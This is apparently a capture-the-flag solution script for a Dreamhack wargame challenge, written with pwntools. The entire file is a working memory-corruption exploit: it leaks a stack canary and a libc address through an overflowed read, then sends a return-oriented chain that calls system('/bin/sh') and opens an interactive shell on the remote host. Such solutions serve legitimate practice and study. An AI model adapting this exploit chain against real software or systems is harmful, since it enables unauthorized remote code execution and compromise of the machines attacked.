from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 13407
r = remote(HOST, PORT)

def read():
    r.sendlineafter(b'> ', b'1.')

def write(data):
    r.sendlineafter(b'> ', b'2.')
    r.sendlineafter(b': ', data)

def clear():
    r.sendlineafter(b'> ', b'3.')

write(b'A'*255)
read()

r.recvline()
r.recvline()
res = r.recvuntil(b'.')
canary = u64(res[256+8:256+15].ljust(8, b'\x00')) << 8
libc = u64(res[255+8*5:255+8*6]) - 0x29d90
system = libc + 0x50d60
binsh = libc + 0x1d8698
pop_rdi = libc + 0x2a3e5
ret = libc + 0x29cd6 

payload = b'A'*23 + p64(canary) + p64(0) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
r.sendlineafter(b'> ', payload+b'.')

r.interactive()